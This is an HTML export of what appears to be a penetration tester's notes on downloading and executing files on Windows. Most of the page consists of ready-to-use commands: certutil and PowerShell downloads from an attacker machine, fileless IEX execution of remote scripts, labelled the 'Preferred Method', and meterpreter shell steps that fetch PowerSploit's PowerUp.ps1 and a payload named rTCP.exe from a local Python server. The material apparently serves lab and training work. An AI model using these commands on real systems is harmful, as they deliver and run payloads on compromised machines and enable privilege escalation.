<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Download and execute file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Download and execute file</h1><br/><br /><br /><strong><h3>Command Line</h3></strong><br />• certutil<br />    <div class="codebox"><pre>certutil -urlcache -f http<span style="color:#ff9d00;font-weight:700">://</span>&lt;kali ip&gt;<span style="color:#ff9d00;font-weight:700">/</span>file.exe file.exe </pre></div><br />• robocopy<br />    robocopy will create subdirectories that don’t exist and copy all the files/sub-directories<br />    <div class="codebox"><pre>robocopy <span style="color:#333333;font-weight:400">\\</span>192.168.70.45<span style="color:#333333;font-weight:400">\L</span>ab12<span style="color:#333333;font-weight:400">\S</span>SF-Win32 C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\L</span>ab12<span style="color:#333333;font-weight:400">\S</span>SF-Win32 <span style="color:#ff9d00;font-weight:700">/</span>e</pre></div><br />    <br /><br /><br /><br /><br /><br /><strong><h3>Powershell</h3></strong><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">Get-Host</span></pre></div><br /><a href=""><img src="images/1074-1.png" alt="images/1074-1.png" /></a><a href=""><img src="images/1074-2.png" alt="images/1074-2.png" /></a><br />Powershell 1 → Server 2008<br />Powershell 2 → 7/Server 2008 R2<br />Powershell 3 → 8/Server 2012<br />Powershell 4 → 8.1/Server 2012 R2<br />Powershell 5 → 10<br /><br /><br />From Command line(cmd) start with  “powershell -c ”<br /><br />There are two primary ways we can download and execute code using PowerShell:<br />• <strong>download to disk</strong><br />   ◇ Powershell 2/3/4/5<br />      ▪ Net.WebClient DownloadFile method<br />         <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).downloadfile(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/DenFox93/prova1/main/example.exe&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\file.exe&quot;</span>)<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; &amp; <span style="color:#333333;font-weight:400">&#39;$env:userprofile\desktop\fileprova.exe&#39;</span>    <span style="color:#0088ff;font-weight:400">#execute the file</span></pre></div><br />      ▪ BITSAdmin.exe<br />      ▪ Certutil.exe w/ -urlcache argument<br />   ◇ Powershell 3/4/5<br />       <a href=""><img src="images/1074-3.png" alt="images/1074-3.png" /></a><br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#00117f;font-weight:400">Invoke-WebRequest</span> <span style="color:#ff9d00;font-weight:700">-</span>Uri <span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.exe&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>Outfile <span style="color:#333333;font-weight:400">&#39;$env:userprofile\desktop\fileprova.exe&#39;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; &amp; <span style="color:#333333;font-weight:400">&#39;$env:userprofile\desktop\fileprova.exe&#39;</span>    <span style="color:#0088ff;font-weight:400">#execute the file</span></pre></div><br />•  download and run within the <strong>PowerShell process memory</strong>, and never touches the disk (Preferred Method)<br />   ◇ Powershell 2/3/4/5<br />       In “example.txt” there is the command “ls” because of that, the machine where we execute the command will list files and directories in the current folder<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.txt&#39;</span>);</pre></div><br />       <a href=""><img src="images/1074-4.png" alt="images/1074-4.png" /></a><br />   ◇ Powershell 3/4/5<br />       In “example.txt” there is the command “ls” because of that, the machine where we execute the command will list files and directories in the current folder<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#00117f;font-weight:400">Invoke-WebRequest</span> <span style="color:#ff9d00;font-weight:700">-</span>Uri <span style="color:#333333;font-weight:400">&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.txt&#39;</span>).Content | <span style="color:#ff9d00;font-weight:700">Invoke-Expression</span></pre></div><br />       <a href=""><img src="images/1074-5.png" alt="images/1074-5.png" /></a><br /><br /><br /><br /><strong>Download from the web</strong><br /><div class="codebox"><pre>meterpreter &gt; shell<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop&gt; powershell -Command <span style="color:#ff9d00;font-weight:700">(</span>New-Object System.Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.downloadfile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;</span>,<span style="color:#3ad900;font-weight:400">&#39;C:\Users\danie\Desktop\new\powerup1.ps1&#39;</span><span style="color:#ff9d00;font-weight:700">)</span></pre></div><br /><br /><br /><strong>Download file from our local server</strong><br />1. create local web server on linux<br />   ◇ with python2<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>            <span style="color:#0088ff;font-weight:400">#positioning in the directory to serve</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python -m SimpleHTTPServer 80     <span style="color:#0088ff;font-weight:400">#create we server</span></pre></div><br />   ◇ with python3<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 -m http.server 80 -d <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span></pre></div><br />2. Download file on Windows<br />    <div class="codebox"><pre>meterpreter &gt; shell<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\d</span>anie<span style="color:#333333;font-weight:400">\D</span>esktop&gt; powershell -Command <span style="color:#ff9d00;font-weight:700">(</span>New-Object System.Net.WebClient<span style="color:#ff9d00;font-weight:700">)</span>.downloadfile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;http://172.16.5.50:8000/rTCP.exe&#39;</span>,<span style="color:#3ad900;font-weight:400">&#39;$env:userprofile\desktop\rTCP.exe&#39;</span><span style="color:#ff9d00;font-weight:700">)</span></pre></div><br /><br /><strong>Upload from via meterpreter</strong><br />    <div class="codebox"><pre>meterpreter&gt; upload <span style="color:#3ad900;font-weight:400">&quot;/home/kali/Desktop/file.txt&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;C:\Users\danie\Desktop\new\file.txt&quot;</span></pre></div><br />    <br /><br /><br /></div>
</body>
</html>
